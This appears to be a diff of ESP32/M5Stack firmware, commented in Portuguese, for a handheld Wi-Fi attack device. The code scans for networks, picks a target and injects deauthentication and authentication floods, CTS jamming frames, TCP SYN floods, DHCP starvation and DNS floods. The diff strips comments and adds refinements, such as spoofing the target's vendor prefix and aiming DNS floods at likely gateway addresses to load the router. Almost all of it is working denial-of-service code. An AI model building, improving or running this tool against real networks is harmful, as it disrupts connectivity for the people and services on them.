@@ -7,11 +7,11 @@
  * Contorna o agendador de tarefas padrão para entregar throughput máximo de injeção 
  * diretamente da IRAM para a interface PHY do rádio Wi-Fi.
  * * Correções Aplicadas nesta Versão (Auditoria 2.0):
- * - [L3 Realism]: Bloqueio de injeção L3 plaintext em redes WPA2/WPA3 (Prevenção de drop MAC/PHY).
- * - [TCP SYN RFC]: Remoção de payload de dados em pacotes SYN para bypass de firewalls SPI.
- * - [DNS RFC]: Criação de payload de Query DNS válido, evitando drop L7 (dnsmasq).
- * - [DMA Race Condition]: Mutex atômico protegendo o laço de injeção durante o Channel Hopping.
- * - [Thermal UX]: Bloqueio inteligente do controle manual de potência quando a placa atinge limite térmico.
+ * - [L3 Realism]: Bloqueio de injeção L3 plaintext em redes WPA2/WPA3.
+ * - [TCP SYN RFC]: Remoção de payload de dados em pacotes SYN.
+ * - [DNS RFC]: Criação de payload de Query DNS válido.
+ * - [DMA Race Condition]: Mutex atômico protegendo o laço de injeção.
+ * - [Thermal UX]: Bloqueio inteligente e controle da preferência do usuário.
  */
 
 #include <M5Unified.h>
@@ -28,61 +28,50 @@
 
 // ===================================================================
 // 1. ESTRUTURAS DE PACOTES (OTIMIZADAS PARA ACESSO DIRETO DMA)
-// Todas as estruturas usam __attribute__((packed)) para evitar "padding"
-// (bytes extras) inseridos pelo compilador, o que corromperia o frame.
 // ===================================================================
 
-/** @brief Frame 802.11 de Desautenticação (Deauth) L2 */
 struct __attribute__((packed)) DeauthPacket {
     uint16_t frame_control; uint16_t duration;
     uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];
     uint16_t seq_ctrl; uint16_t reason_code;
 };
 
-/** @brief Frame 802.11 de Autenticação L2 (Estresse na tabela de estados do AP) */
 struct __attribute__((packed)) AuthPacket {
     uint16_t frame_control; uint16_t duration;
     uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];
     uint16_t seq_ctrl; uint16_t auth_algorithm; uint16_t auth_seq; uint16_t status_code;
 };
 
-/** @brief Frame 802.11 Clear-to-Send (CTS) usado para Jamming silencioso em RF */
 struct __attribute__((packed)) CtsPacket {
     uint16_t frame_control; uint16_t duration; uint8_t  mac_ra[6];     
 };
 
-/** @brief Cabeçalho MAC 802.11 Genérico (Data Frame L3) */
 struct __attribute__((packed)) MacHeader {
     uint16_t frame_control; uint16_t duration;
     uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];  
     uint16_t seq_ctrl;
 };
 
-/** @brief Cabeçalho LLC/SNAP para encapsulamento IP sobre 802.11 */
 struct __attribute__((packed)) LlcSnapHeader {
     uint8_t dsap; uint8_t ssap; uint8_t control; uint8_t oui[3]; uint16_t ethertype;
 };
 
-/** @brief Cabeçalho IPv4 */
 struct __attribute__((packed)) IpHeader {
     uint8_t  version_ihl; uint8_t  tos; uint16_t total_length; uint16_t id;
     uint16_t frag_off; uint8_t  ttl; uint8_t  protocol; uint16_t checksum;
     uint8_t  ip_src[4]; uint8_t  ip_dest[4];    
 };
 
-/** @brief Cabeçalho UDP (DNS/DHCP Flood) */
 struct __attribute__((packed)) UdpHeader {
     uint16_t src_port; uint16_t dest_port; uint16_t length; uint16_t checksum;
 };
 
-/** @brief Cabeçalho TCP (SYN Flood Direcionado) */
 struct __attribute__((packed)) TcpHeader {
     uint16_t src_port; uint16_t dest_port; uint32_t seq_num; uint32_t ack_num;
     uint8_t  data_offset_res; uint8_t  flags; uint16_t window_size;
     uint16_t checksum; uint16_t urgent_ptr;
 };
 
-/** @brief Estrutura unificada contínua para injeção L3 (IRAM -> PHY Rádio) */
 struct __attribute__((packed)) SilverBulletPacket {
     MacHeader mac;
     LlcSnapHeader llc;
@@ -90,7 +79,6 @@ struct __attribute__((packed)) SilverBulletPacket {
     uint8_t l4_and_payload[288]; 
 };
 
-/** @brief Pseudo Header IP (Usado matematicamente para cálculo de Checksum TCP/UDP) */
 struct __attribute__((packed)) PseudoHeader {
     uint8_t src_ip[4]; uint8_t dest_ip[4]; uint8_t reserved; uint8_t protocol; uint16_t l4_length;
 };
@@ -104,19 +92,19 @@ wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
 uint16_t total_alvos = 0;
 int alvo_selecionado = 0;
 
-// Flags atômicas para segurança em arquitetura Multi-Core (Core 0 / Core 1)
 std::atomic<uint8_t> canal_atual_alvo{0};
 std::atomic<int8_t> rssi_alvo{0};
 std::atomic<bool> alvo_perdido{false};
 std::atomic<bool> tx_power_max{true}; 
+std::atomic<bool> tx_power_max_user{true}; // CORREÇÃO 2.5: Guarda a vontade original do usuário
 std::atomic<bool> flag_update_config{false}; 
 std::atomic<bool> erro_memoria_critico{false}; 
-std::atomic<bool> scanner_pausa_ataque{false}; // Proteção contra Race Conditions no DMA
-std::atomic<bool> thermal_lock{false};         // Impede usuário de queimar a placa forçando TX no máximo
+std::atomic<bool> scanner_pausa_ataque{false}; 
+std::atomic<bool> thermal_lock{false};         
 
 std::atomic<uint32_t> pacotes_enviados_segundo{0};
 std::atomic<uint32_t> pps_atual{0};
-uint32_t prng_state = 1; // Estado para a geração pseudo-aleatória ultrarrápida (IRAM)
+uint32_t prng_state = 1; 
 temperature_sensor_handle_t temp_sensor = NULL;
 
 enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
@@ -126,10 +114,10 @@ enum ModoAtaque { MODO_MANUAL_L2, MODO_MANUAL_L3, MODO_MANUAL_CTS, MODO_AUTOMATI
 std::atomic<ModoAtaque> modo_ativo{MODO_AUTOMATICO};
 
 enum EstrategiaAuto { 
-    ESTRATEGIA_LEGACY_CRITICA,    // Redes Abertas/WEP (Vulneráveis a injeção L3 direta)
-    ESTRATEGIA_WPA2_TKIP_CRITICA, // Vulnerável a Deauth e sobrecarga L2
-    ESTRATEGIA_WPA2_AES_PADRAO,   // Requer CTS + L2 pesado
-    ESTRATEGIA_WPA3_BLINDADO,     // Imune a Deauth clássico. Usa CTS puro.
+    ESTRATEGIA_LEGACY_CRITICA,    
+    ESTRATEGIA_WPA2_TKIP_CRITICA, 
+    ESTRATEGIA_WPA2_AES_PADRAO,   
+    ESTRATEGIA_WPA3_BLINDADO,     
     ESTRATEGIA_SINAL_MEDIO, 
     ESTRATEGIA_SINAL_FRACO, 
     ESTRATEGIA_DESCONHECIDA 
@@ -141,10 +129,6 @@ enum FabricanteCPE {
     FABRICANTE_TPLINK, FABRICANTE_INTELBRAS, FABRICANTE_ZTE 
 };
 
-/**
- * @brief Identifica o fabricante (OUI) para alinhar o vetor de ataque TCP SYN
- * @details Cobre os principais fabricantes do mercado de provedores (ISP).
- */
 FabricanteCPE identificar_fabricante(uint8_t* mac) {
     if ((mac[0] == 0x4C && mac[1] == 0x5E && mac[2] == 0x0C) || 
         (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x42) || 
@@ -183,8 +167,6 @@ const char* get_nome_modo() {
 
 // ===================================================================
 // 3. MOTORES MATEMÁTICOS DE ALTA PERFORMANCE (IRAM)
-// Funções marcadas com IRAM_ATTR rodam diretamente da RAM do processador,
-// sem depender de buscas na memória Flash, entregando latência zero.
 // ===================================================================
 
 IRAM_ATTR inline uint32_t fast_rand() {
@@ -224,14 +206,12 @@ IRAM_ATTR inline uint16_t fast_l4_checksum(IpHeader *ip, void *l4_hdr, size_t l4
 void analisar_alvo_automaticamente(int indice_alvo) {
     wifi_ap_record_t ap = alvos_encontrados[indice_alvo];
     
-    // 1. Estratificação de RF
     if (ap.rssi < -80) {
         estrategia_atual.store(ESTRATEGIA_SINAL_FRACO); return;
     } else if (ap.rssi >= -80 && ap.rssi < -70) {
         estrategia_atual.store(ESTRATEGIA_SINAL_MEDIO); return;
     }
 
-    // 2. Avaliação Profunda de Cifra (Compreensão Física de L3)
     if (ap.authmode == WIFI_AUTH_WPA3_PSK || ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || ap.authmode == WIFI_AUTH_ENTERPRISE) {
         estrategia_atual.store(ESTRATEGIA_WPA3_BLINDADO);
     }
@@ -252,6 +232,8 @@ void analisar_alvo_automaticamente(int indice_alvo) {
 // ===================================================================
 
 void escanear_redes() {
+    alvo_perdido.store(false); // CORREÇÃO 1.1: Previne deadlock de flag suja em novo scan
+
     M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
     M5.Display.println("📡 Escaneando Redes...");
     esp_wifi_set_mode(WIFI_MODE_STA);
@@ -308,18 +290,22 @@ void task_display(void *pvParameters) {
                 float tsens_out = 0.0;
                 if (temp_sensor != NULL) temperature_sensor_get_celsius(temp_sensor, &tsens_out);
                 
-                // UX Fix: Thermal Throttling Ativo (Aplica o Thermal Lock)
                 if (tsens_out > 75.0 && !thermal_lock.load()) { 
                     thermal_lock.store(true); tx_power_max.store(false); flag_update_config.store(true); 
                 } 
                 else if (tsens_out < 65.0 && thermal_lock.load()) { 
-                    thermal_lock.store(false); tx_power_max.store(true); flag_update_config.store(true); 
+                    thermal_lock.store(false); 
+                    tx_power_max.store(tx_power_max_user.load()); // CORREÇÃO 2.5: Respeito à vontade original
+                    flag_update_config.store(true); 
                 }
                 
                 if (thermal_lock.load()) M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                 else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                 
                 M5.Display.printf("CH: %d | TEMP: %.1fC | %s\n", canal_atual_alvo.load(), tsens_out, tx_power_max.load() ? "MAX" : "ECO");
+
+                // CORREÇÃO 3.7: Limpeza de Ghosting gráfico antes de repintar os status em L40
+                M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK);
 
                 M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                 if(scanner_pausa_ataque.load()) M5.Display.printf("> RASTREANDO FUGA (CH PURSUIT)...\n");
@@ -328,6 +314,7 @@ void task_display(void *pvParameters) {
                 M5.Display.setCursor(0, 60); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
                 M5.Display.printf(">> INJETANDO: %d PPS <<\n", pps_atual.load());
             } else {
+                M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK); // CORREÇÃO 3.7 extra
                 M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK); M5.Display.printf("⚠️ ALVO PERDIDO\n");
             }
         }
@@ -405,7 +392,6 @@ void task_ataque(void *pvParameters) {
             ModoAtaque modo = modo_ativo.load();
             EstrategiaAuto estrategia = estrategia_atual.load();
 
-            // Setup L2 Base
             deauth->frame_control = 0x00C0; deauth->duration = 0; 
             deauth->reason_code = reason_codes[fast_rand() % 5];
             memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
@@ -416,17 +402,14 @@ void task_ataque(void *pvParameters) {
 
             cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo, 6);
 
-            // Setup L3 Base
             pkt->mac.frame_control = 0x0108; pkt->mac.duration = 0;
             pkt->ip.version_ihl = 0x45; pkt->ip.ttl = 64; pkt->ip.tos = 0; 
 
             bool atirar_l2 = false, atirar_cts = false, atirar_l3 = false;
 
-            // Decisão Tática: Limitando injeção L3 plaintext apenas para redes expostas (LEGACY_CRITICA)
-            // L3 falhará fisicamente no PHY se tentarmos injetar frames Data(0x0108) plaintext em AES-CCMP.
             if (modo == MODO_MANUAL_L2) atirar_l2 = true;
             else if (modo == MODO_MANUAL_CTS) atirar_cts = true;
-            else if (modo == MODO_MANUAL_L3) atirar_l3 = true; // Manual Override (Aviso: Ineficiente em WPA2/3)
+            else if (modo == MODO_MANUAL_L3) atirar_l3 = true; 
             else if (modo == MODO_AUTOMATICO) {
                 switch (estrategia) {
                     case ESTRATEGIA_SINAL_FRACO: atirar_cts = true; break;
@@ -434,14 +417,17 @@ void task_ataque(void *pvParameters) {
                     case ESTRATEGIA_WPA3_BLINDADO: atirar_cts = true; break;
                     case ESTRATEGIA_WPA2_AES_PADRAO: atirar_l2 = true; atirar_cts = true; break;
                     case ESTRATEGIA_WPA2_TKIP_CRITICA: atirar_l2 = true; break;
-                    case ESTRATEGIA_LEGACY_CRITICA: atirar_l2 = true; atirar_l3 = true; break; // L3 Permitido!
+                    case ESTRATEGIA_LEGACY_CRITICA: atirar_l2 = true; atirar_l3 = true; break; 
                     default: break;
                 }
             }
             
             if (atirar_l2) {
                 for(int j = 0; j < 5; j++) { 
+                    // CORREÇÃO 1.2: Clona o OUI alvo para prevenir MAC Multicast randômico proveniente de Heap-lixo.
+                    memcpy(auth->mac_src, mac_alvo, 3);
                     auth->mac_src[3] = fast_rand() & 0xFF; auth->mac_src[4] = fast_rand() & 0xFF; auth->mac_src[5] = fast_rand() & 0xFF;
+                    
                     auth->seq_ctrl = (fast_rand() & 0xFFF) << 4; deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                     if (esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
                     if (esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
@@ -456,7 +442,6 @@ void task_ataque(void *pvParameters) {
                 int chance_tcp_syn = 6; int chance_dhcp = 2;  
 
                 for (int i = 0; i < 15; i++) { 
-                    // Proteção de Race Condition: Aborta IRAM loop se Thread 1 iniciar busca de canal
                     if (scanner_pausa_ataque.load()) break;
 
                     memset(pkt->l4_and_payload, 0, sizeof(pkt->l4_and_payload));
@@ -475,13 +460,9 @@ void task_ataque(void *pvParameters) {
                     
                     size_t t_injecao = 0;
                     
-                    // ==========================================
-                    // TCP SYN RFC Compliance Fix
-                    // Pacotes SYN *não* devem conter payload.
-                    // ==========================================
                     if (is_tcp) {
                         TcpHeader* tcp = (TcpHeader*)pkt->l4_and_payload;
-                        size_t t_payload = 0; // Fix: Drop por firewall mitigado (Tamanho do payload = 0)
+                        size_t t_payload = 0; 
 
                         pkt->ip.protocol = 6; 
                         
@@ -500,7 +481,7 @@ void task_ataque(void *pvParameters) {
                         
                         tcp->dest_port = htons(porta_alvo); 
                         tcp->seq_num = fast_rand(); tcp->ack_num = 0;
-                        tcp->data_offset_res = (5 << 4); tcp->flags = 0x02; // SYN
+                        tcp->data_offset_res = (5 << 4); tcp->flags = 0x02; 
                         tcp->window_size = htons(5840); tcp->urgent_ptr = 0;
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
@@ -510,9 +491,6 @@ void task_ataque(void *pvParameters) {
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                         tcp->checksum = 0; tcp->checksum = fast_l4_checksum(&pkt->ip, tcp, sizeof(TcpHeader), nullptr, t_payload);
                     } 
-                    // ==========================================
-                    // DHCP STARVATION
-                    // ==========================================
                     else if (is_dhcp) {
                         UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
                         uint8_t* payload = pkt->l4_and_payload + sizeof(UdpHeader);
@@ -540,30 +518,31 @@ void task_ataque(void *pvParameters) {
                         uint16_t calc_chk = fast_l4_checksum(&pkt->ip, udp, sizeof(UdpHeader), payload, 248);
                         udp->checksum = (calc_chk == 0x0000) ? 0xFFFF : calc_chk;
                     }
-                    // ==========================================
-                    // DNS FLOOD RFC Fix (Dnsmasq Evasion)
-                    // ==========================================
                     else { 
                         UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
                         uint8_t* payload = pkt->l4_and_payload + sizeof(UdpHeader);
                         
-                        // Fix: Query DNS formatada e válida para forçar carga de processamento do roteador alvo
                         uint8_t dns_query[] = {
-                            (uint8_t)(fast_rand() & 0xFF), (uint8_t)(fast_rand() & 0xFF), // Transaction ID 
-                            0x01, 0x00, // Flags: Standard query
-                            0x00, 0x01, // Questions: 1
-                            0x00, 0x00, // Answer RRs: 0
-                            0x00, 0x00, // Authority RRs: 0
-                            0x00, 0x00, // Additional RRs: 0
-                            0x06, 'g', 'o', 'o', 'g', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00, // QNAME
-                            0x00, 0x01, // QTYPE: A 
-                            0x00, 0x01  // QCLASS: IN
+                            (uint8_t)(fast_rand() & 0xFF), (uint8_t)(fast_rand() & 0xFF), 
+                            0x01, 0x00, 
+                            0x00, 0x01, 
+                            0x00, 0x00, 
+                            0x00, 0x00, 
+                            0x00, 0x00, 
+                            0x06, 'g', 'o', 'o', 'g', 'l', 'e', 0x03, 'c', 'o', 'm', 0x00, 
+                            0x00, 0x01,  
+                            0x00, 0x01  
                         };
                         size_t t_payload = sizeof(dns_query);
                         memcpy(payload, dns_query, t_payload);
 
                         pkt->ip.protocol = 17; 
-                        pkt->ip.ip_dest[0] = 8; pkt->ip.ip_dest[1] = 8; pkt->ip.ip_dest[2] = 8; pkt->ip.ip_dest[3] = 8; 
+                        
+                        // CORREÇÃO 2.4: Roteamento inteligente para forçar processamento pelo dnsmasq local do equipamento alvo
+                        int gw_idx = fast_rand() % 5;
+                        pkt->ip.ip_dest[0] = common_gateways[gw_idx][0]; pkt->ip.ip_dest[1] = common_gateways[gw_idx][1]; 
+                        pkt->ip.ip_dest[2] = common_gateways[gw_idx][2]; pkt->ip.ip_dest[3] = common_gateways[gw_idx][3];
+
                         udp->src_port = htons(1024 + (fast_rand() % 60000)); udp->dest_port = htons(53); 
                         
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + t_payload;
@@ -597,7 +576,15 @@ void task_ataque(void *pvParameters) {
 extern "C" void app_main(void) {
     auto cfg = M5.config(); M5.begin(cfg); M5.Display.setRotation(1); M5.Display.setTextSize(1.5);
     
-    nvs_flash_init(); esp_netif_init(); esp_event_loop_create_default();
+    // CORREÇÃO 3.6: Inicialização segura e robusta da NVS (Memory Wipe em caso de corrupção)
+    esp_err_t ret = nvs_flash_init();
+    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
+        ESP_ERROR_CHECK(nvs_flash_erase());
+        ret = nvs_flash_init();
+    }
+    ESP_ERROR_CHECK(ret);
+
+    esp_netif_init(); esp_event_loop_create_default();
     
     wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_wifi_init(&wifi_cfg); 
@@ -627,10 +614,10 @@ extern "C" void app_main(void) {
                 if (M5.Keyboard.isKeyPressed(KEY_UP)) { alvo_selecionado = (alvo_selecionado - 1 + total_alvos) % total_alvos; desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(150)); }
             }
             
-            // UX Fix: Ignorar tecla de potência se estiver bloqueado térmicamente
             if (M5.Keyboard.isKeyPressed(' ')) { 
                 if (!thermal_lock.load()) {
-                    tx_power_max.store(!tx_power_max.load()); 
+                    tx_power_max_user.store(!tx_power_max_user.load()); // CORREÇÃO 2.5: Registra no "banco" a vontade do user
+                    tx_power_max.store(tx_power_max_user.load()); // Aplica ao estado ativo
                     desenhar_menu(); 
                 }
                 vTaskDelay(pdMS_TO_TICKS(200)); 
@@ -647,12 +634,13 @@ extern "C" void app_main(void) {
         } 
         else if (estado_atual.load() == ESTADO_ATIRAR) {
             if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+                alvo_perdido.store(false); // CORREÇÃO 1.1: Reset da flag de travamento irreversível
                 estado_atual.store(ESTADO_SELECIONAR); escanear_redes(); desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(300));
             }
-            // UX Fix: Ignorar tecla de potência se estiver bloqueado térmicamente
             if (M5.Keyboard.isKeyPressed(' ')) { 
                 if (!thermal_lock.load()) {
-                    tx_power_max.store(!tx_power_max.load()); 
+                    tx_power_max_user.store(!tx_power_max_user.load()); // CORREÇÃO 2.5
+                    tx_power_max.store(tx_power_max_user.load()); 
                     flag_update_config.store(true); 
                 }
                 vTaskDelay(pdMS_TO_TICKS(200)); 
